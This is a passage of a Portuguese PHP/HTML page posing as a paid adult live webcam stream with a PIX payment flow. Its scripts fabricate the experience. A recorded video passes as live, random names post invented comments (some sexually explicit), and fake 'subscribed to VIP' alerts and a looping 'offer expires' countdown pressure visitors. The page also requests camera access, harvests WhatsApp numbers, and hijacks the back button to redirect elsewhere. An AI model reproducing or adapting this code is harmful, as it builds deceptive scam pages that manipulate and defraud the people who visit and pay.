                    <text x="30" y="16" text-anchor="middle" fill="white" font-size="12" font-weight="bold">AO VIVO</text>
                </svg>
            </div>
            <button class="vip-button" id="buyVipButton">
                <i class="fas fa-crown"></i> COMPRAR VIP
            </button>
        </div>
    </div>

    <!-- Main Video Container -->
    <div class="video-container">
        <!-- Loading GIF (shown initially) -->
        <img id="loadingGif" src="/carregando.gif" alt="Carregando..." style="width: 100%; height: 100%; object-fit: cover; z-index: 2;">
        
        <!-- Actual video (hidden initially) -->
        <video id="liveVideo" playsinline autoplay muted style="display: none; width: 100%; height: 100%; object-fit: cover; z-index: 1;">
            <source src="/live.mp4" type="video/mp4">
        </video>
    </div>

    <!-- User Camera -->
    <div class="user-camera-container">
        <video id="userCamera" playsinline autoplay muted></video>
        <div class="camera-overlay" id="cameraOverlay">
            <p>Apenas VIP pode ativar câmera</p>
        </div>
        <div class="camera-denied" id="cameraDenied" style="display: none;">
            <p>CAMERA NEGADA</p>
            <p>toque aqui para permitir novamente</p>
        </div>
    </div>

    <!-- Comments Container -->
    <div class="comments-container" id="commentsContainer"></div>

    <!-- Comment Notification -->
    <div class="comment-notification" id="commentNotification">
        Torne-se VIP para comentar
    </div>

    <!-- Notification Container -->
    <div class="notification" id="notification" style="display: none;">
        <i class="fas fa-check-circle"></i>
        <span id="notification-text"></span>
    </div>

    <!-- Bottom Controls -->
    <div class="bottom-controls">
        <div class="interaction-buttons">
            <button class="interaction-button" id="likeButton">
                <i class="fas fa-heart" style="color: var(--primary-color);"></i>
                <span class="interaction-count" id="likes-count">3</span>
            </button>
        </div>
        <input type="text" class="comment-input" id="commentInput" placeholder="Deixe um comentário...">
    </div>

    <!-- Phone Input Container -->
    <div class="payment-container" id="phoneContainer">
        <h3>Conecte-se para Participar</h3>
        <div class="divider"></div>
        <h2>Digite seu Whatsapp</h2>
        
        <div class="phone-input-container">
            <input type="tel" id="phoneInput" placeholder="+55 (__) _____ - ____" maxlength="15" class="phone-input">
            <p class="input-error" id="phoneError" style="display: none;">Digite um número válido</p>
        </div>
        
        <button class="copy-button" onclick="validateAndSubmitPhone()">
            <i class="fas fa-arrow-right"></i> Continuar
        </button>
    </div>
    
    <!-- Payment Container -->
    <div class="payment-container" id="paymentContainer">
        <div class="countdown-timer">
    <div class="timer-label">OFERTA EXPIRA EM</div>
    <div class="timer-container">
        <div class="timer-unit">
            <div class="flip-card" id="minutes-tens">
                <div class="top">1</div>
                <div class="bottom">1</div>
            </div>
            <div class="flip-card" id="minutes-ones">
                <div class="top">5</div>
                <div class="bottom">5</div>
            </div>
            <div class="timer-separator">:</div>
            <div class="flip-card" id="seconds-tens">
                <div class="top">0</div>
                <div class="bottom">0</div>
            </div>
            <div class="flip-card" id="seconds-ones">
                <div class="top">0</div>
                <div class="bottom">0</div>
            </div>
        </div>
        <div class="timer-text">minutos : segundos</div>
    </div>
</div>
        <h2>R$ <?php echo $valorFormatado; ?></h2>
        
        <div class="qr-code-img">
            <img src="<?php echo $imgpix; ?>" alt="QR Code PIX" id="qrCodeImg">
        </div>
        <div class="pix-code" id="pixCode" onclick="copyPixCode()"><?php echo $pixqr; ?></div>
        <button class="copy-button" onclick="copyPixCode()">
            <i class="fas fa-copy"></i> Copiar PIX
        </button>
        <p class="payment-note">Copie o código PIX e pague pelo seu banco. O acesso VIP será liberado após o pagamento.</p>
        
        <div id="statusPagamento" class="status-pending">
            <span class="loaderSpinner"></span> Aguardando pagamento...
        </div>
    </div>

    <!-- Copy notification -->
    <div id="copyMessage">
        <i class="fas fa-check-circle"></i>
        <span>Código PIX copiado com sucesso!</span>
    </div>

    <!-- Audio Alert -->
    <div class="audio-alert" id="audioAlert">
        <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="speaker-muted-icon">
            <path d="M11 5L6 9H2v6h4l5 4V5z"></path>
            <line x1="23" y1="9" x2="17" y2="15"></line>
            <line x1="17" y1="9" x2="23" y2="15"></line>
        </svg>
        <p>Ative o som para assistir ao vivo</p>
        <button onclick="enableAudio()">Ativar Som</button>
    </div>

    <script>
        // DOM Elements
        const liveVideo = document.getElementById('liveVideo');
        const userCamera = document.getElementById('userCamera');
        const cameraOverlay = document.getElementById('cameraOverlay');
        const cameraDenied = document.getElementById('cameraDenied');
        const commentsContainer = document.getElementById('commentsContainer');
        const notification = document.getElementById('notification');
        const notificationText = document.getElementById('notification-text');
        const vipCounter = document.getElementById('vip-counter');
        const likesCount = document.getElementById('likes-count');
        const likeButton = document.getElementById('likeButton');
        const commentInput = document.getElementById('commentInput');
        const commentNotification = document.getElementById('commentNotification');
        const phoneContainer = document.getElementById('phoneContainer');
        const paymentContainer = document.getElementById('paymentContainer');
        const qrCodeImg = document.getElementById('qrCodeImg');
        const pixCode = document.getElementById('pixCode');
        const audioAlert = document.getElementById('audioAlert');
        const statusPagamento = document.getElementById('statusPagamento');
        const buyVipButton = document.getElementById('buyVipButton');
        const loadingGif = document.getElementById('loadingGif');
        
        // Variables to track state
        let vipCount = 3; // Changed from 85 to 3
        let likesValue = 3;
        let notificationsInterval;
        let commentsInterval;
        let audioEnabled = false;
        let videoStarted = false;
        let cameraAllowed = false;
        let typebotClosed = false;
        let typebotOpened = false;
        let transactionId = "<?php echo $transactionId; ?>";
        let checkInterval = 2000; // Check every 2 seconds
        let maxVideoDuration = 240; // 4 minutes in seconds
        let videoStartTime = 0;
        let videoCurrentTime = 0;

        // Sample data
        const names = [
            'Victor', 'Bruno', 'Roger', 'Diego', 'Edvaldo', 
            'Felipe', 'Gilberto', 'Ryan', 'Israel', 'João',
            'Mateus', 'Lucas', 'Adão', 'Natan', 'Fabiano',
            'Paulo', 'Wagner', 'Rafael', 'Raul', 'Thiago'
        ];

        const comments = [
            'linda demais 😍',
            'Gostei do VIP 🔥',
            'Manda beijo pra mim ❤️',
            'De qual cidade você é',
            'Arregaça essa bucetinha gostosa',
            'maravilhosa!',
            'Assinei o VIP agora, q delícia 💯',
            'Amo suas lives 24h',
            'Linda maravilhosa', 
            'Gatinha maravilhosa', 
            'Te chamei no wpp gata', 
            'De onde você é gata',
            'Adorei o show de ontem',
            'Bixa boa da porra Vey!', 
            'Mostra seu cuzinho',
        ];

        const avatars = [
            'https://livemodelo.com/pics/profile1.jpg',
            'https://livemodelo.com/pics/profile2.jpg',
            'https://livemodelo.com/pics/profile3.jpg',
            'https://livemodelo.com/pics/profile4.jpg',
            'https://livemodelo.com/pics/profile5.jpg',
            'https://livemodelo.com/pics/profile6.jpg',
            'https://livemodelo.com/pics/profile7.jpg',
            'https://livemodelo.com/pics/profile8.jpg',
            'https://livemodelo.com/pics/profile9.jpg'
        ];

        // Initialize
        document.addEventListener('DOMContentLoaded', () => {
            // Request camera access
            requestCameraAccess();
            
            // Initialize video
            initializeVideo();
            
            // Setup event listeners
            setupEventListeners();
            
            // Listen for Typebot chat events
            setupTypebotListener();
            
            // Make camera draggable
            makeCameraDraggable();
            
            // Update typebot button visibility
            updateTypebotButtonVisibility();
        });

        // Function to setup event listeners
        function setupEventListeners() {
            // Comment input click event
            commentInput.addEventListener('click', showCommentNotification);
            
            // Like button click event
            likeButton.addEventListener('click', handleLikeClick);
            
            // Buy VIP button
            buyVipButton.addEventListener('click', showPhoneContainer);
            
            // Camera denied retry
            cameraDenied.addEventListener('click', requestCameraAccess);
            
            // Video ended event
            liveVideo.addEventListener('ended', () => {
                if (!typebotOpened || (typebotOpened && typebotClosed)) {
                    showPhoneContainer();
                }
            });
            
            // Video timeupdate event to track progress
            liveVideo.addEventListener('timeupdate', updateVideoProgress);
            
            // Add input event for phone formatting
            document.getElementById('phoneInput').addEventListener('input', function() {
                formatPhoneNumber(this);
            });
        }

        // Function to update video progress
        function updateVideoProgress() {
            if (!videoStarted) return;
            
            videoCurrentTime = Math.floor(liveVideo.currentTime);
        }

        // Function to request camera access
        function requestCameraAccess() {
            navigator.mediaDevices.getUserMedia({ video: true })
                .then(stream => {
                    userCamera.srcObject = stream;
                    cameraAllowed = true;
                    cameraOverlay.style.display = 'flex';
                    cameraDenied.style.display = 'none';
                })
                .catch(err => {
                    console.error("Camera access denied: ", err);
                    cameraAllowed = false;
                    cameraOverlay.style.display = 'none';
                    cameraDenied.style.display = 'flex';
                });
        }

        // Function to initialize video
        function initializeVideo() {
            // Display loading GIF initially
            loadingGif.style.display = 'block';
            liveVideo.style.display = 'none';
            
            // Show audio prompt immediately
            setTimeout(() => {
                showAudioAlert();
            }, 10);
            
            // Add click event to unmute video
            loadingGif.addEventListener('click', () => {
                enableAudio();
            });
        }

        // Function to show audio alert
        function showAudioAlert() {
            audioAlert.style.display = 'flex';
        }

        // Function to enable audio and start video
        function enableAudio() {
            // Hide the loading GIF and show video
            loadingGif.style.display = 'none';
            liveVideo.style.display = 'block';
            
            // Enable audio and start the video
            liveVideo.muted = false;
            liveVideo.volume = 1;
            liveVideo.classList.add('active');
            liveVideo.play();
            
            // Hide the audio alert
            audioAlert.style.display = 'none';
            
            // Set state
            audioEnabled = true;
            videoStarted = true;
            videoStartTime = Date.now();
            
            // Start comments and notifications
            startComments();
            startNotifications();
            
            // Start checking payment status
            startCheckingPaymentStatus();
        }

        // Function to start fake comments
        function startComments() {
            showComment(); // Show first comment immediately
            commentsInterval = setInterval(showComment, getRandomTime(5000, 15000));
        }

        // Function to show a single comment
        function showComment() {
            if (!videoStarted) return;
            
            const commentElement = document.createElement('div');
            commentElement.className = 'comment';
            
            const randomName = names[Math.floor(Math.random() * names.length)];
            const randomComment = comments[Math.floor(Math.random() * comments.length)];
            const randomAvatar = avatars[Math.floor(Math.random() * avatars.length)];
            
            // Randomly add VIP tag to some comments
            const showVipTag = Math.random() > 0.5;
            const vipTagHtml = showVipTag ? '<span class="vip-tag"><i class="fas fa-crown"></i> VIP</span>' : '';
            
            commentElement.innerHTML = `
                <img src="${randomAvatar}" class="comment-avatar">
                <div class="comment-text">
                    <span class="commenter-name">${randomName}</span>${vipTagHtml}
                    <div>${randomComment}</div>
                </div>
            `;
            
            commentsContainer.appendChild(commentElement);
            
            // Remove comment after animation completes
            setTimeout(() => {
                commentElement.remove();
            }, 5000);
        }

        // Function to start fake notifications
        function startNotifications() {
            showNotification(); // Show first notification immediately
            notificationsInterval = setInterval(showNotification, getRandomTime(5000, 10000));
        }

        // Function to show a VIP subscription notification
        function showNotification() {
            if (!videoStarted) return;
            
            const randomName = names[Math.floor(Math.random() * names.length)];
            notificationText.textContent = `${randomName} ASSINOU O VIP`;
            notification.style.display = 'flex';
            
            // Update viewer counter - limited to max 9
            if (vipCount < 9) { // Changed to limit at 9
                vipCount++;
                vipCounter.textContent = vipCount;
            }
            
            // Hide notification after animation
            setTimeout(() => {
                notification.style.display = 'none';
            }, 3000);
        }

        // Function to show comment notification
        function showCommentNotification() {
            commentNotification.classList.add('show');
            
            setTimeout(() => {
                commentNotification.classList.remove('show');
            }, 2000);
        }

        // Function to handle like button click - Modified to work without limits
        function handleLikeClick() {
            likesValue++;
            updateLikesDisplay();
            
            // Add heart animation
            const heart = document.createElement('div');
            heart.className = 'heart-animation';
            heart.style.cssText = `
                position: fixed;
                bottom: 60px;
                left: 30px;
                font-size: 28px;
                color: var(--primary-color);
                animation: floatUp 1.5s forwards;
                z-index: 1000;
                opacity: 0;
            `;
            heart.innerHTML = '<i class="fas fa-heart"></i>';
            document.body.appendChild(heart);
            
            // Remove heart after animation
            setTimeout(() => {
                heart.remove();
            }, 1500);
        }

        // Function to update likes display
        function updateLikesDisplay() {
            likesCount.textContent = likesValue;
            
            // Add pulse animation
            likesCount.style.animation = 'none';
            setTimeout(() => {
                likesCount.style.animation = 'pulse 0.5s';
            }, 10);
            
            // Add animation keyframes if not already added
            if (!document.querySelector('#likes-animation-keyframes')) {
                const style = document.createElement('style');
                style.id = 'likes-animation-keyframes';
                style.innerHTML = `
                    @keyframes pulse {
                        0% { transform: scale(1); }
                        50% { transform: scale(1.3); }
                        100% { transform: scale(1); }
                    }
                `;
                document.head.appendChild(style);
            }
        }

        // Function to show phone input container
        function showPhoneContainer() {
            // Only show the container if chat is not open
            if (!typebotOpened) {
                phoneContainer.classList.add('active');
            }
        }
        
        // Function to show payment container
        function showPaymentContainer() {
            phoneContainer.classList.remove('active');
            paymentContainer.classList.add('active');
        }
        
        // Function to validate and format phone number
        function formatPhoneNumber(input) {
            // Remove all non-digits
            let value = input.value.replace(/\D/g, '');
            
            // Format as (XX) XXXXX-XXXX
            if (value.length <= 2) {
                input.value = value.length ? `(${value}` : value;
            } else if (value.length <= 7) {
                input.value = `(${value.substring(0, 2)}) ${value.substring(2)}`;
            } else if (value.length <= 11) {
                input.value = `(${value.substring(0, 2)}) ${value.substring(2, 7)}-${value.substring(7)}`;
            } else {
                input.value = `(${value.substring(0, 2)}) ${value.substring(2, 7)}-${value.substring(7, 11)}`;
            }
        }
        
        // Function to validate and submit phone
        function validateAndSubmitPhone() {
            const phoneInput = document.getElementById('phoneInput');
            const phoneError = document.getElementById('phoneError');
            const phoneValue = phoneInput.value.replace(/\D/g, '');
            
            // Check if phone number is valid (10 or 11 digits for Brazil)
            if (phoneValue.length < 10 || phoneValue.length > 11) {
                phoneError.style.display = 'block';
                return;
            }
            
            // Hide error message
            phoneError.style.display = 'none';
            
            // Save the phone number to database (in a real implementation, this would be an AJAX request)
            savePhoneNumber(phoneInput.value);
            
            // Show payment container
            showPaymentContainer();
        }
        
        // Function to save phone number to database
        function savePhoneNumber(phoneNumber) {
            console.log('Phone number saved:', phoneNumber);
            
            // In a real implementation, you would send this to your server with fetch or XMLHttpRequest
            fetch('save_phone.php', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({ phone: phoneNumber }),
            })
            .then(response => response.json())
            .then(data => {
                console.log('Success:', data);
            })
            .catch((error) => {
                console.error('Error:', error);
            });
        }

        // Function to copy PIX code
        function copyPixCode() {
            const code = document.getElementById('pixCode').textContent;
            navigator.clipboard.writeText(code).then(() => {
                // Show copy notification
                const copyMessage = document.getElementById('copyMessage');
                copyMessage.style.display = 'flex';
                setTimeout(() => {
                    copyMessage.style.display = 'none';
                }, 3000);
            }).catch(err => {
                console.error('Erro ao copiar: ', err);
            });
        }

        // Function to start checking payment status
        function startCheckingPaymentStatus() {
            checkTransactionStatus();
        }

        // Function to check transaction status
        function checkTransactionStatus() {
            if (!transactionId) {
                console.log("Aguardando o ID da transação...");
                setTimeout(checkTransactionStatus, checkInterval);
                return;
            }

            const url = `verificar_status.php?transaction_id=${transactionId}`;

            fetch(url)
                .then(response => response.json())
                .then(data => {
                    console.log(`Status da transação: ${data.status}`);
                    
                    if (data.status === "PAID") {
                        // Atualiza o status visual
                        statusPagamento.innerHTML = '<i class="fas fa-check-circle"></i> Pagamento confirmado! Redirecionando...';
                        statusPagamento.classList.remove("status-pending");
                        statusPagamento.classList.add("status-success");
                        
                        // Redireciona após 2 segundos
                        setTimeout(() => {
                            window.location.href = "https://livemodelo.com/menu/homehome.php?id=14.70"; // Página de destino após pagamento
                        }, 2000);
                    } else {
                        // Continua verificando
                        setTimeout(checkTransactionStatus, checkInterval);
                    }
                })
                .catch(error => {
                    console.error("Erro ao verificar o status:", error);
                    setTimeout(checkTransactionStatus, checkInterval);
                });
        }

        // Function to setup Typebot listener
        function setupTypebotListener() {
            window.addEventListener('message', (event) => {
                try {
                    // Check if the message is from Typebot
                    if (event.data && (event.data.source === 'typebot' || event.data.from === 'typebot')) {
                        console.log('Received message from Typebot:', event.data);
                        
                        // Check for chat opened events
                        if (event.data.type === 'chatOpened' || event.data.event === 'chatOpened') {
                            console.log('Typebot chat opened');
                            typebotOpened = true;
                            typebotClosed = false;
                        }
                        
                        // Check for chat closed events
                        if (event.data.type === 'chatClosed' || event.data.event === 'chatClosed') {
                            console.log('Typebot chat closed');
                            typebotClosed = true;
                            typebotOpened = false;
                            
                            // Only show the phone container if chat was opened and then closed
                            if (typebotOpened) {
                                setTimeout(() => {
                                    showPhoneContainer();
                                }, 1000);
                            }
                        }
                    }
                } catch (error) {
                    console.error('Error processing message event:', error);
                }
            });
        }

        // Function to make camera draggable - MODIFIED to position on the right side
        function makeCameraDraggable() {
            const camera = document.querySelector('.user-camera-container');
            let isDragging = false;
            let offsetX, offsetY;

            // Position initially on the right side above the comment input
            const initialPosition = () => {
                const commentInput = document.getElementById('commentInput');
                const inputRect = commentInput.getBoundingClientRect();
                
                camera.style.position = 'absolute';
                camera.style.bottom = 'auto';
                camera.style.left = 'auto';
                camera.style.right = '10px';
                camera.style.top = (inputRect.top - camera.offsetHeight - 5) + 'px';
            };
            
            // Call initially
            initialPosition();
            
            // Recalculate on window resize
            window.addEventListener('resize', initialPosition);

            // Mouse events for desktop
            camera.addEventListener('mousedown', startDrag);
            document.addEventListener('mousemove', drag);
            document.addEventListener('mouseup', endDrag);

            // Touch events for mobile
            camera.addEventListener('touchstart', startDragTouch);
            document.addEventListener('touchmove', dragTouch);
            document.addEventListener('touchend', endDrag);

            function startDrag(e) {
                e.preventDefault();
                isDragging = true;
                offsetX = e.clientX - camera.getBoundingClientRect().left;
                offsetY = e.clientY - camera.getBoundingClientRect().top;
                camera.classList.add('dragging');
            }

            function startDragTouch(e) {
                const touch = e.touches[0];
                isDragging = true;
                offsetX = touch.clientX - camera.getBoundingClientRect().left;
                offsetY = touch.clientY - camera.getBoundingClientRect().top;
                camera.classList.add('dragging');
            }

            function drag(e) {
                if (!isDragging) return;
                e.preventDefault();
                
                const x = e.clientX - offsetX;
                const y = e.clientY - offsetY;
                
                // Ensure it stays within viewport bounds
                const maxX = window.innerWidth - camera.offsetWidth;
                const maxY = window.innerHeight - camera.offsetHeight;
                
                // Check for collision with other elements
                if (!isColliding(x, y)) {
                    camera.style.left = `${Math.max(0, Math.min(maxX, x))}px`;
                    camera.style.top = `${Math.max(0, Math.min(maxY, y))}px`;
                    camera.style.right = 'auto';
                    camera.style.bottom = 'auto';
                }
            }

            function dragTouch(e) {
                if (!isDragging) return;
                
                const touch = e.touches[0];
                const x = touch.clientX - offsetX;
                const y = touch.clientY - offsetY;
                
                // Ensure it stays within viewport bounds
                const maxX = window.innerWidth - camera.offsetWidth;
                const maxY = window.innerHeight - camera.offsetHeight;
                
                // Check for collision with other elements
                if (!isColliding(x, y)) {
                    camera.style.left = `${Math.max(0, Math.min(maxX, x))}px`;
                    camera.style.top = `${Math.max(0, Math.min(maxY, y))}px`;
                    camera.style.right = 'auto';
                    camera.style.bottom = 'auto';
                }
            }

            function endDrag() {
                isDragging = false;
                camera.classList.remove('dragging');
            }
            
            // Simple collision detection with important elements
            function isColliding(x, y) {
                const cameraWidth = camera.offsetWidth;
                const cameraHeight = camera.offsetHeight;
                
                // Define important elements to avoid
                const elements = [
                    document.querySelector('.header'),
                    document.querySelector('.bottom-controls'),
                    document.getElementById('notification'),
                    document.getElementById('commentNotification')
                ].filter(el => el !== null);
                
                // Check for collision with each element
                for (const element of elements) {
                    const rect = element.getBoundingClientRect();
                    
                    if (
                        x < rect.right &&
                        x + cameraWidth > rect.left &&
                        y < rect.bottom &&
                        y + cameraHeight > rect.top
                    ) {
                        return true; // Collision detected
                    }
                }
                
                return false;
            }
        }

        // Function to update typebot button visibility
        function updateTypebotButtonVisibility() {
            setTimeout(() => {
                const typebotButton = document.getElementById('typebot-bubble-button');
                
                if (!typebotButton) return;
                
                const checkContainers = () => {
                    if (phoneContainer.classList.contains('active') || paymentContainer.classList.contains('active')) {
                        typebotButton.style.opacity = '1';
                        typebotButton.style.pointerEvents = 'all';
                        typebotButton.style.top = '80px';
                    } else {
                        typebotButton.style.opacity = '0';
                        typebotButton.style.pointerEvents = 'none';
                    }
                };
                
                // Create a MutationObserver to watch for class changes
                const observer = new MutationObserver(mutations => {
                    mutations.forEach(mutation => {
                        if (mutation.attributeName === 'class') {
                            checkContainers();
                        }
                    });
                });
                
                // Start observing the containers
                observer.observe(phoneContainer, { attributes: true });
                observer.observe(paymentContainer, { attributes: true });
                
                // Initial check
                checkContainers();
            }, 1000); // Give time for Typebot to initialize
        }

        // Helper function to get random time
        function getRandomTime(min, max) {
            return Math.floor(Math.random() * (max - min + 1)) + min;
        }
        // Timer Elements
const minutesTens = document.getElementById('minutes-tens');
const minutesOnes = document.getElementById('minutes-ones');
const secondsTens = document.getElementById('seconds-tens');
const secondsOnes = document.getElementById('seconds-ones');

// Function to initialize countdown timer
function initCountdownTimer() {
    // Set initial time: 15 minutes
    let totalSeconds = 15 * 60;
    
    // Update the timer display initially
    updateTimerDisplay(totalSeconds);
    
    // Start the countdown
    const timerInterval = setInterval(() => {
        totalSeconds--;
        
        if (totalSeconds <= 0) {
            clearInterval(timerInterval);
            // You can add behavior for when timer reaches zero
            totalSeconds = 15 * 60; // Reset to 15 minutes (loop the timer)
        }
        
        updateTimerDisplay(totalSeconds);
    }, 1000);
}

// Function to update timer display with flip animation
function updateTimerDisplay(totalSeconds) {
    const minutes = Math.floor(totalSeconds / 60);
    const seconds = totalSeconds % 60;
    
    const minutesTensDigit = Math.floor(minutes / 10);
    const minutesOnesDigit = minutes % 10;
    const secondsTensDigit = Math.floor(seconds / 10);
    const secondsOnesDigit = seconds % 10;
    
    // Update minutes tens digit with animation if changed
    if (minutesTens.querySelector('.top').textContent != minutesTensDigit) {
        flipDigit(minutesTens, minutesTensDigit);
    }
    
    // Update minutes ones digit with animation if changed
    if (minutesOnes.querySelector('.top').textContent != minutesOnesDigit) {
        flipDigit(minutesOnes, minutesOnesDigit);
    }
    
    // Update seconds tens digit with animation if changed
    if (secondsTens.querySelector('.top').textContent != secondsTensDigit) {
        flipDigit(secondsTens, secondsTensDigit);
    }
    
    // Update seconds ones digit with animation if changed
    if (secondsOnes.querySelector('.top').textContent != secondsOnesDigit) {
        flipDigit(secondsOnes, secondsOnesDigit);
    }
}

// Function to flip a digit with animation
function flipDigit(digitElement, newValue) {
    // Add flipping class to trigger animation
    digitElement.classList.add('flipping');
    
    // Update the digit value halfway through the animation
    setTimeout(() => {
        digitElement.querySelector('.top').textContent = newValue;
        digitElement.querySelector('.bottom').textContent = newValue;
        
        // Remove the flipping class after animation completes
        setTimeout(() => {
            digitElement.classList.remove('flipping');
        }, 250);
    }, 250);
}

// Inicialize o cronômetro (chamado no final do setupEventListeners)
initCountdownTimer();
    </script>
    <script>
(function () {
  const redirectUrl = 'https://livemodelo.com/menu/homehome3.php';  // mesmo URL acima

  // 1️⃣ Impede que o usuário use o botão VOLTAR para retornar a esta página.
  history.pushState(null, '', location.href);
  window.addEventListener('popstate', function () {
    location.replace(redirectUrl);
  });

  // 2️⃣ Caso ele tente atualizar ou fechar/abrir de novo (F5 / Ctrl+R / recarregar),
  //    o backend já bloqueia via PHP, mas este event listener reforça a intenção
  //    de saída antes do servidor responder.
  window.addEventListener('beforeunload', function () {
    // Nada precisa ser feito aqui além de deixar o PHP cuidar do redirect
    // na próxima requisição. Este handler existe apenas para cobrir algumas
    // implementações de navegador mais antigas.
  });
})();
</script>
    
</body>
</html>